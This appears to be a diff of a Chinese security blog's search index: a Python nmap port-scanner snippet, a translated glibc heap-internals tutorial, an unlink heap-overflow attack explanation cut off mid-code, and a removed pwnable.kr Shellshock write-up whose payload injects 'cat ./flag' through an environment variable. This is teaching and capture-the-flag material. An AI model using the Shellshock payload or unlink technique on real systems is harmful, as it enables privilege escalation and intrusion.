+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> nmap</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;192.168.56.1&#x27;</span></span><br><span class="line"><span class="comment"># 把nmap.exe的路径放入PortScanner中，否则会有环境变量错误</span></span><br><span class="line">nm = nmap.PortScanner(nmap_search_path=(<span class="string">&#x27;nmap&#x27;</span>, <span class="string">r&quot;E:\nmap\nmap.exe&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">130</span>, <span class="number">136</span>):</span><br><span class="line">    result = nm.scan(host, str(port))</span><br><span class="line">    <span class="comment"># 在主机192.168.56.1上获取端口22/tcp状态</span></span><br><span class="line">    state = result[<span class="string">&#x27;scan&#x27;</span>][<span class="string">&#x27;192.168.56.1&#x27;</span>][<span class="string">&#x27;tcp&#x27;</span>][int(port)][<span class="string">&#x27;state&#x27;</span>]</span><br><span class="line">    print(<span class="string">&#x27;[%s] port state: %s&#x27;</span> % (port, state))</span><br></pre></td></tr></table></figure>
+<p>使用<strong>netstat -an</strong>查看本机开启的端口服务，用端口135测试代码运行的正确性</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/1.png" class></strong></p>
+<p>也可以直接使用zenmap工具进行端口扫描：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/5.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>Nmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Heap I</title>
+    <url>/xiaohong404.github.io/2020/10/16/Heap/Heap-I/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/0.png" class></strong></p>
+ <a id="more"></a>
+<p><a href="https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/">原版传送门</a></p>
+<h3 id="what-is-the-heap-and-why-do-people-use-it"><a class="markdownIt-Anchor" href="#what-is-the-heap-and-why-do-people-use-it"></a> <strong>WHAT IS THE HEAP, AND WHY DO PEOPLE USE IT?</strong></h3>
+<p>堆是C/C++程序员在程序执行期间手动分配的新的区域。程序员通过调用堆相关的函数如<em>malloc</em>向堆管理器请求这部分区域。这些被分配的内存区域，或者称为“allocations”，之后可以被程序员一直使用、修改或者引用，直到他们不再需要这部分区域，会调用free函数将这部分区域返还给堆管理器。</p>
+<p>下面是一个C语言程序分配、使用并且释放堆上的结构体的例子：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> field1;</span><br><span class="line">    <span class="keyword">char</span>* field2;</span><br><span class="line">&#125; SomeStruct;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SomeStruct* myObject = (SomeStruct*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SomeStruct));</span><br><span class="line">    <span class="keyword">if</span>(myObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        myObject-&gt;field1 = <span class="number">1234</span>;</span><br><span class="line">        myObject-&gt;field2 = “Hello World!”;</span><br><span class="line">        do_stuff(myObject);</span><br><span class="line">	<span class="built_in">free</span>(myObject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以只要程序员遵循下面几个小的规则，堆管理器将确保每个已分配的堆不会相互重叠。这个特点使得堆非常有用并且高效，这和大多数C/C++程序追求性能的要求相符合。</p>
+<p>接下来的图表列出了一些程序员在使用堆时的基本规则，以及在程序员违反这些规则时发生的一些漏洞类别。之后，我将更详细地讨论所有这些与堆相关的漏洞类别，目前只讨论堆使用正确时的表现。</p>
+<h3 id="heap-rules"><a class="markdownIt-Anchor" href="#heap-rules"></a> HEAP RULES</h3>
+<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/1.png" class></strong></p>
+<p>当然，<em>malloc</em>和<em>free</em>并不是C和C<ins>程序员与堆进行交互的唯一方式。相反，C</ins>开发人员通常通过C<ins>运算符new和new []分配内存。必须使用相应的C</ins>运算符delete和delete []而不是<em>free</em>释放这些分配。程序员还可以通过与malloc兼容的堆函数（例如<a href="http://man7.org/linux/man-pages/man3/calloc.3p.html"><em>calloc</em></a>，<a href="http://man7.org/linux/man-pages/man3/realloc.3p.html"><em>realloc</em></a>和<a href="https://linux.die.net/man/3/memalign"><em>memalign）</em></a>来分配内存，这些函数最终也通过<em>free</em>释放，就像<em>malloc</em>一样。</p>
+<p>为简单起见，将首先讨论<em>malloc</em>和<em>free</em>，下面是一个C++程序如何分配，使用和释放堆上的结构体的例子：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SomeClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> field1;</span><br><span class="line">    <span class="keyword">char</span>* field2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SomeClass* myObject = <span class="keyword">new</span> SomeClass();</span><br><span class="line">    myObject-&gt;field1 = <span class="number">1234</span>;</span><br><span class="line">    myObject-&gt;field2 = “Hello World!”;</span><br><span class="line">    do_stuff(myObject);</span><br><span class="line">    <span class="keyword">delete</span> myObject;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="memory-chunks-and-the-chunk-allocation-strategies"><a class="markdownIt-Anchor" href="#memory-chunks-and-the-chunk-allocation-strategies"></a> <strong>MEMORY CHUNKS AND THE CHUNK ALLOCATION STRATEGIES</strong></h3>
+<p>假设一个程序员通过malloc需求10字节内存，为了满足这个请求，堆管理器不仅仅只随机寻找一个10字节的程序员可以写的区域，而是需要做更多的事情。堆管理器也需要存储此次分配的元数据。这个元数据被存储在紧邻分配的10字节区域处。</p>
+<p>堆管理器还需要确保分配空间在32位系统上是8字节对齐的，在64位系统上是16字节对齐的。如果程序员只想存储文本字符串或字节数组之类的数据，那么分配空间的对齐方式无关紧要。但是如果程序员打算使用分配空间来存储更多复杂的数据结构，则对齐方式会对程序的正确性和性能会产生重大影响。由于<em>malloc</em>无法知道程序员将在分配空间中存储什么内容，因此堆管理器必须默认确保所有分配空间均对齐。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/2.png" class></strong></p>
+<p>此分配元数据和对齐填充字节与<em>malloc</em>的内存区域将一起被存储并返回给程序员。因此，堆管理器在内部分配的“块”内存比程序员最初要求的稍大。当程序员要求10个字节的内存时，堆管理器会找到或创建一个新的内存块，该块足以存储10个字节的空间、元数据以及对齐填充字节。然后，堆管理器将此块标记为“已分配”，并返回指向块内对齐的10字节“用户数据”区域的指针，程序员将收到<em>malloc</em>调用的返回值。</p>
+<h3 id="chunk-allocation-basic-strategy"><a class="markdownIt-Anchor" href="#chunk-allocation-basic-strategy"></a> <strong>CHUNK ALLOCATION: BASIC STRATEGY</strong></h3>
+<p>那么堆管理器如何在内部分配这些块呢？</p>
+<p>首先，让我们看一下堆管理器的大部分工作，分配小块内存的（大大简化的）策略。我将在详细地解释每个步骤，之后我们就可以研究分配大块内存的特殊情况。</p>
+<p>简化的小块分配策略如下：</p>
+<ol>
+<li>
+<p>如果有一个先前释放的内存块，并且该块足够大，可以满足用户的请求，则堆管理器将使用这个释放的块进行新的分配。</p>
+</li>
+<li>
+<p>否则，如果堆顶部有可用空间，则堆管理器将从这个空闲的空间中分配一个新的块并使用它。</p>
+</li>
+<li>
+<p>否则，堆管理器将要求内核向堆的末尾添加新的内存，并且从新分配的空间中分配一个新块给用户。</p>
+</li>
+<li>
+<p>如果前面所有策略均失败，则无法为提供分配服务，并且<em>malloc</em>返回NULL。</p>
+</li>
+</ol>
+<h4 id="allocating-from-freed-chunks"><a class="markdownIt-Anchor" href="#allocating-from-freed-chunks"></a> <strong>ALLOCATING FROM FREE’D CHUNKS</strong></h4>
+<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/3.png" class></strong></p>
+<p>从概念上讲，分配之前释放的块非常简单。因为当一个块在内存中被释放，堆管理器会在一系列称为*“bins”<em>的不同链表中记录这些释放的块。用户发出一个分配请求后，堆管理器会在这些</em>“bins”<em>中搜索一个足够大的空闲块，为用户提供服务。如果可以成功找到一个，则将这个空闲块从特定的bin中删除，并标记为“已分配”，然后这个指向该“user data”区域块的指针，会作为</em>malloc*的返回值返回给程序员。</p>
+<p>出于性能原因，有几种不同类型的<em>bins</em>，即<em>fast bins 、unsorted bins 、small bins、large bins 、per-thread tcache</em>。下个部分将详细讨论这些不同种类的<em>bins</em>。</p>
+<h4 id="allocating-from-the-top-of-the-heap"><a class="markdownIt-Anchor" href="#allocating-from-the-top-of-the-heap"></a> <strong>ALLOCATING FROM THE TOP OF THE HEAP</strong></h4>
+<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/4.gif" class></strong></p>
+<p>如果没有可用的空闲块可以满足分配请求，则堆管理器必须从头开始构造一个新块。为此，堆管理器首先查看堆顶部是否有足够的可用空间（有时称为“top chunk”或“remainder chunk”）。如果存在，堆管理器将在此可用空间基础上构造一个新块。</p>
+<h4 id="asking-the-kernel-for-more-memory-at-the-top-of-the-heap"><a class="markdownIt-Anchor" href="#asking-the-kernel-for-more-memory-at-the-top-of-the-heap"></a> <strong>ASKING THE KERNEL FOR MORE MEMORY AT THE TOP OF THE HEAP</strong></h4>
+<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/5.gif" class></strong></p>
+<p>一旦堆顶部的可用空间用完，堆管理器将不得不要求内核在堆的末尾增加更多内存。</p>
+<p>在建立堆的开始阶段上，堆管理器通过调用<a href="http://man7.org/linux/man-pages/man2/sbrk.2.html"><em>sbrk</em></a>，要求内核在堆末尾分配更多的内存。在大多数基于Linux的系统上，在内部使用称为“ <a href="https://linux.die.net/man/2/brk">brk</a> ”的系统调用。这个系统调用的名称很容易混淆，它最初的意思是“更改程序中断位置”，通俗来说，它表示在程序加载到内存之后，该区域会增加更多的内存。因为这是堆管理器从一开始创建堆的地方，所以此系统调用的作用是在程序堆的末尾分配更多的内存。</p>
+<p>最终，如果一直使用<em>sbrk</em>扩展堆会导致分配失败，因为堆空间增长得太大之后，进一步扩展将导致其与进程地址空间中的其他内容发生冲突，例如内存映射，共享库或线程的堆栈区域。因此sbrk无法分配时，堆管理器将使用<a href="http://man7.org/linux/man-pages/man2/mmap.2.html"><em>mmap</em></a>调用将新的非连续内存<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l2320">附加</a>到初始程序堆。</p>
+<p>如果<em>mmap</em>也失败，则该进程根本无法分配更多的内存，并且<em>malloc</em>将返回NULL。</p>
+<h3 id="off-heap-allocations-via-mmap"><a class="markdownIt-Anchor" href="#off-heap-allocations-via-mmap"></a> <strong>OFF-HEAP ALLOCATIONS VIA MMAP</strong></h3>
+<p>很大的分配请求（超过某个阈值*）在堆管理器中会得到<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l866">特殊处理</a>。通过直接调用<em>mmap</em>可以在堆外分配这些大块，并使用块中元数据的标记位来标记这一事实。当这些巨大块通过调用<em>free</em>释放到堆管理器时，堆管理器将通过<em>munmap</em>将整个<em>mmap</em> 过的区域返还给系统。</p>
+<p>*默认情况下，此<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l858">阈值</a> 在32位系统上为128KB~512KB，在64位系统上为32MB，但是，如果堆管理器检测到这些分配的大块内存只需要被临时使用，则此阈值也会<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l949">动态增加</a>。</p>
+<h3 id="arenas"><a class="markdownIt-Anchor" href="#arenas"></a> <strong>ARENAS</strong></h3>
+<p>在多线程应用程序上，堆管理器需要保护内部堆数据结构免受可能导致程序崩溃的竞争条件的影响。在<em>ptmalloc2</em>之前，堆管理器通过在每次堆操作之前简单地使用全局互斥锁，以确保在任何给定时间只有一个线程可以与堆进行交互。</p>
+<p>尽管此策略有效，但堆分配器对高利用率和性能非常敏感，以至于导致使用大量线程的应用程序出现严重的性能问题。为了解决这个问题，<em>ptmalloc2</em>堆分配器引入了*“arenas”<em>的概念。每个</em>“arenas”<em>本质上是一个完全不同的堆，它完全独立地管理自己的块分配和</em>free bins*。每个*“arenas”<em>仍然使用互斥锁来序列化不同线程对内部数据结构的访问，但是只要线程与不同的</em>“arenas”*进行交互，线程就可以安全地执行堆操作而不会彼此停顿。</p>
+<p>程序的初始（“main”）<em>“arenas”<em>仅包含我们已经看到的堆，对于单线程应用程序，这是堆管理器将使用的唯一</em>arena</em>。但是，随着新线程加入该进程，堆管理器会为每个新线程分配并附加*“arenas”<em>，以减少</em>malloc<em>和</em>free*等操作的等待时间。</p>
+<p>对于每个加入该进程的新线程，堆管理器将先查找没有被其他线程在使用的*“arenas”<em>，并将该</em>“arenas”<em>附加到该线程。一旦所有可用的</em>“arenas”<em>都是在其它线程使用中，堆管理器将<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/arena.c;h=efca2bcf682667c618e285b2357888d10d336c5f;hb=HEAD#l872">创建一个新的</a></em>“arenas”<em>，直到</em>“arenas”<em>的数目达到最大（32位进程为CPU核心数的2倍、64位进程位CPU核心的8倍）。一旦最终达到该限制，堆管理器就会放弃分配，这样多个线程将必须共享一个</em>“arenas”*，即执行堆操作将需要那些线程中的一个等待另一个线程。</p>
+<p>但是这些二级*“arenas”<em>如何工作？我们看到，主堆在程序加载到内存的紧邻其后的位置，并使用</em>brk<em>系统调用对其进行扩展开始工作，但二级</em>“arenas”<em>并不相同，这些二级</em>“arenas”<em>使用</em>mmap<em>和</em>mprotect*创建的一个或多个“<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/arena.c;h=efca2bcf682667c618e285b2357888d10d336c5f;hb=HEAD#l452">子堆</a>”来模拟主堆的行为。</p>
+<h3 id="subheaps"><a class="markdownIt-Anchor" href="#subheaps"></a> <strong>SUBHEAPS</strong></h3>
+<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/6.png" class></strong></p>
+<p>子堆的工作方式与初始程序堆基本相同，主要存在两个区别。初始堆位于程序加载到内存之后的紧邻其后的位置，并且由<em>sbrk</em>动态扩展。相比之下，每个子堆使用<em>mmap</em>定位到内存中，堆管理器使用<em>mprotect</em>手动模拟增长子堆。</p>
+<p>当堆管理器想要创建子堆时，它首先通过调用<em>mmap</em>要求内核保留该子堆可能增长到的内存区域*。*保留该区域不会将内存直接分配到子堆中；它只是要求内核不要在该区域内分配诸如线程堆栈，mmap区域或者其它的分配任务。*默认情况下，子堆大小最大（即保留该子堆使用的内存区域）在32位上为1MB，在64位系统上为64MB。</p>
+<p>这是通过<em>mmap</em>询问标记为<em>PROT_NONE</em>的页面来完成的，这表明内核仅需要为该区域保留地址范围，不需要内核将内存直接分配给它。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/7.png" class></strong></p>
+<p>在使用<em>sbrk</em>增长初始堆的地方，堆管理器通过手动调用<a href="http://man7.org/linux/man-pages/man2/mprotect.2.html"><em>mprotect</em></a>将区域中的页面从<em>PROT_NONE</em>更改为<em>PROT_READ | PROT_WRITE</em>来将子堆“增长”到此保留的地址范围。这导致内核将物理内存附加到那些地址，实际上也会导致子堆缓慢增长，直到整个<em>mmap</em>区域已满。一旦整个子堆都用完，<em>arenas</em>便会分配另一个子堆。这将允许二级*”arenas”*几乎无限期地保持增长，直到内核耗尽内存或进程耗尽地址空间时才会失败。</p>
+<h4 id="recap"><a class="markdownIt-Anchor" href="#recap"></a> Recap：</h4>
+<p>初始（“main”）<em>arena</em>仅包含主堆，该主堆位于将程序二进制文件加载到内存之后的位置，并使用<em>sbrk</em>进行扩展。这是用于单线程应用程序的唯一<em>arena</em>。在多线程应用程序上，为新线程分配了二级<em>arena</em>，从中可以分配这些二级<em>arena</em>。使用<em>arenas</em>可以降低线程在执行堆操作之前需要等待互斥锁的可能性，从而提高了程序的速度。与<em>main arena</em>不同，这些二级<em>arena</em>从一个或多个子堆中分配块，这些子堆在内存中的位置首先使用<em>mmap</em>进行确定，并通过使用<em>mprotect</em>进行扩展。</p>
+<h3 id="chunk-metadata"><a class="markdownIt-Anchor" href="#chunk-metadata"></a> <strong>CHUNK METADATA</strong></h3>
+<p>现在，了解了分配块的所有不同方式，这些块不仅包含提供给程序员的“用户数据”区域（作为<em>malloc</em>的返回值），同时包含元数据。下面介绍元数据实际记录的值以及存放的位置。</p>
+<p>块的元数据在内存中的<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1038">确切布局</a>可能会很混乱，因为堆管理器源代码将一个块末尾的元数据与下一个块末尾的元数据组合在一起，并且几个存在并被使用的元数据字段取决于不同种类的chunk。</p>
+<p>现在，我们仅看一下实时分配，它具有单个<em>size_t</em> * 标头，该标头位于给程序员的“用户数据”区域的后面。此字段（在源代码中称为<em>mchunk_size</em>）是在<em>malloc</em>期间写入的，之后由<em>free</em>决定如何处理该分配空间的释放。</p>
+<p>* size_t值在32位系统上为4字节整数，在64位系统上为8字节整数。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/8.png" class></strong></p>
+<p>该<em>mchunk_size</em>存储了四种信息：块的大小，以及被称为“A”,“M”和“P”三比特位。这些都被存储在相同的<em>size_t</em>字段中，因为块大小始终是8字节对齐的（在64位上是16字节对齐），因此，块大小的低三位始终为零。</p>
+<p><strong>“ A ”标志</strong>是用来告诉堆管理器，是否该块属于二级<em>arena</em>，而不是在<em>main arena</em>。在free期间，堆管理器仅仅给了一个指向程序员想要释放空间的指针，并且堆管理器需要确定该指针属于哪一个<em>arena</em>。如果在块的元数据中A标志被设置，则堆管理器必须搜索每个<em>arena</em>，并查看指针是否位于该<em>arena</em>的任何子堆中。如果未设置该标志，则堆管理器可以减少搜索，因为它知道该块来自初始的<em>arena</em>。</p>
+<p><strong>“ M ”标志</strong>用于指示该块是一个通过<em>mmap</em>进行堆外分配的巨大分配。当此分配空间最终返回给<em>free时</em>，堆管理器将通过<em>munmap</em>立即将整个块返回给操作系统，而不是尝试对其进行回收。因此，空闲即已经被释放的块永远不会设置该标志位。</p>
+<p><strong>“ P ”标志</strong>令人困惑，因为它实际上属于先前的块。它指示先前的块是一个空闲块。这意味着当这个块被释放时，可以将其安全地连接到先前的块上，以创建更大的空闲块。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/9.gif" class></strong></p>
+<p>下面是一些和堆相关的文章：</p>
+<ul>
+<li><a href="http://phrack.org/issues/57/9.html">Once upon a free()</a></li>
+<li><a href="http://phrack.org/issues/66/10.html">Malloc des-maleficarum</a></li>
+<li><a href="http://phrack.org/issues/67/8.html">The house of lore</a></li>
+<li><a href="http://phrack.org/issues/61/6.html">Advanced Doug Lea’s malloc exploits</a></li>
+<li><a href="http://phrack.org/issues/66/6.html">Yet another free() exploitation technique</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
+        <category>Heap</category>
+        <category>Heap_Basic</category>
       </categories>
       <tags>
         <tag>PWN</tag>
       </tags>
   </entry>
   <entry>
-    <title>shellshock</title>
-    <url>/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/0.png" class></strong></p>
+    <title>unlink漏洞攻击</title>
+    <url>/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/0.png" class></strong></p>
  <a id="more"></a>
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/1.png" class></strong></p>
-<h3 id="查看shellshockc源文件"><a class="markdownIt-Anchor" href="#查看shellshockc源文件"></a> 查看shellshock.c源文件</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/2.png" class></strong></p>
-<p>程序依次运行三个函数*<a href="https://www.man7.org/linux/man-pages/man2/setresgid.2.html">setresuid、setresgid</a>、system*</p>
-<h3 id="查看程序的执行权限"><a class="markdownIt-Anchor" href="#查看程序的执行权限"></a> 查看程序的执行权限</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/3.png" class></strong></p>
-<p>以shellshock身份启动时，程序的权限是other权限r-x，而在setresuid和setresgid中使用的是effective gid，也就是shellshock_pwn的权限r-s，当程序执行到system时，程序已经具有shellshock_pwn组权限了。</p>
-<p><strong>这个组权限对于flag文件来说是可读的（r–）</strong>，但是问题在于这一段程序并没有涉及对flag的读操作，权限虽然有了，但怎么办呢？显然这里利用shellshock漏洞。可通过下面的命令证明确实存在shellshock漏洞：</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; ./bash -c &quot;echo this is a test&quot;</span><br></pre></td></tr></table></figure>
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/4.png" class></strong></p>
-<p>实际上，“x=’() { :;}; echo vulnerable”​是new出来了一个新的环境变量：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">KEY=x</span><br><span class="line">VALUE=() &#123;:;&#125;; echo vulnerable</span><br></pre></td></tr></table></figure>
-<p>而当我们后续执行bash的时候，最终会定位到initialize_shell_variables中，这个函数内部会遍历所有的环境变量，而我们设计的VALUE绕过了其中一个export函数的定义检查，使得最终执行的是后面的echo vulnerable串。所以，调用bash的时候，自定义的这个语句就会触发。简而言之，这个漏洞会把用户输入的指令当作代码执行。</p>
-<p>于是，我们在这条语句的基础上将自定义语句换为bash -c “cat ./flag”，执行的程序bash -c换成./shellshock(它内部调用了bash -c ‘echo shock_me’)，因此当执行shellshock中的system函数会调用bash，总而自动执行cat flag这条命令，因为./shellshock执行时拿到了shellshock_pwn的权限，从而破壳漏洞可以在此权限上成功执行了cat ./flag，即成功实现了提权操作。</p>
-<h3 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h3>
-<p>运行下面语句拿到flag</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; bash -c &quot;cat ./flag&quot;&#x27; ./shellshock</span><br></pre></td></tr></table></figure>
-<p><strong></strong></p>
-<p>关于shellshock漏洞相关知识可参考：</p>
-<p>1、<a href="https://www.baidu.com/link?url=3yWq37n7Y_LHRUa2L-iudGGqqgT-6s4gKmaU0_hOQBDFSacVZ_bxZqpA999gplxb_gOwXfn9XSE9mE53bYkDBK&amp;wd=&amp;eqid=e40eff4200053949000000035aa32eda">关于<em>ShellShock</em>漏洞的利用过程和原理解析 - CSDN博客</a></p>
-<p>2、<a href="http://www.freebuf.com/articles/system/45390.html">破壳（ShellShock）漏洞样本分析报告</a></p>
+<h2 id="从一段代码开始"><a class="markdownIt-Anchor" href="#从一段代码开始"></a> 从一段代码开始</h2>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *first, *second;</span><br><span class="line">    first = <span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">    second = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(first);</span><br><span class="line">    <span class="built_in">free</span>(second);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述程序在分配完堆后，堆内存分布如下图所示：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/1.png" class></strong></p>
+<p>程序中 strcpy 函数会导致堆溢出，argv[1] 大于 666 字节时，可覆盖第二个 chunk 的各个字段为指定的值，从而使堆管理器将第二个 chunk 判断为空闲状态。根据 malloc 的内存回收机制，在 free(first) 时会将上图中的 second chunk 从 bin 中 unlink，并与第一个 chunk 合并。通过修改 second chunk 的 fd、bk 字段，unlink 时可把 free 函数的 GOT 表项写为 shellcode 地址。当程序再次调用 free 函数时会执行 shellcode。</p>
+<h2 id="什么是unlink"><a class="markdownIt-Anchor" href="#什么是unlink"></a> 什么是unlink</h2>
+<p>unlink攻击技术就是利用”glibc malloc”的内存回收机制，当堆块free时，会检查相邻的后面的堆块（地址更小的）或者前面的堆块（地址更大的）是否空闲，如果空闲，那么需要进行堆块合并操作。</p>
+<p>空闲的堆块一般以双向链表的形式组织（<strong>fast bin</strong>是单向链表，此攻击不适用），如果刚刚释放的堆块要与前面或者后面空闲的堆块进行合并操作，那么需要将前或后的堆块从双向链表中摘下来，合并成更大的堆块插入到<strong>unsort bin</strong>链表中。空闲堆块从（<strong>small bin</strong>)双向链表中摘下来的操作就是unlink。</p>
+<h3 id="向后合并"><a class="markdownIt-Anchor" href="#向后合并"></a> 向后合并</h3>
+<p>首先判断前一个 chunk 是否空闲，即检查当前 chunk 的 PREV_INUSE（P）位是否为 0。若为空闲，则将其合并。合并时，改变当前 chunk 指针指向前一个 chunk，使用 unlink 宏将前一个空闲 chunk 从 bin 中移除，最后更新合并后 chunk 的大小。</p>
+<p>malloc.c 中向后合并的代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></span><br><span class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></span><br><span class="line">INTERNAL_SIZE_T prevsz; <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">sz = hd &amp; ~PREV_INUSE;</span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!(hd &amp; PREV_INUSE))</span><br><span class="line">&#123;</span><br><span class="line">  prevsz = p-&gt;prev_size;</span><br><span class="line">  p = chunk_at_offset(p, -(<span class="keyword">long</span>)prevsz);</span><br><span class="line">  sz += prevsz;</span><br><span class="line">  unlink(p, bck, fwd);</span><br><span class="line">&#125;</span><br><span class="line">set_head(p, sz | PREV_INUSE);</span><br></pre></td></tr></table></figure>
+<p>本例中，释放 1st chunk 时，当前 chunk(1st chunk) 的前一个 chunk 是 allocated，所以不能向后合并，unlink 宏不会被调用。</p>
+<h3 id="向前合并"><a class="markdownIt-Anchor" href="#向前合并"></a> 向前合并</h3>
+<p>首先判断下个 chunk 是否空闲，即检查下下个 chunk（相对当前 chunk）的 PREV_INUSE（P）位是否为 0，若为 0 表明下个 chunk 是空闲的，则进行合并。合并时使用 unlink 宏将下个 chunk 从它的 bin 中移除，并更新合并后的 chunk 大小。</p>
+<p>malloc.c 中向前合并的代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)\</span></span><br><span class="line"> (((mchunkptr)(((<span class="keyword">char</span>*)(p)) + (s)))-&gt;size &amp; PREV_INUSE)</span><br><span class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></span><br><span class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></span><br><span class="line">sz = hd &amp; ~PREV_INUSE;</span><br><span class="line">next = chunk_at_offset(p, sz);</span><br><span class="line">nextsz = chunksize(next);</span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> 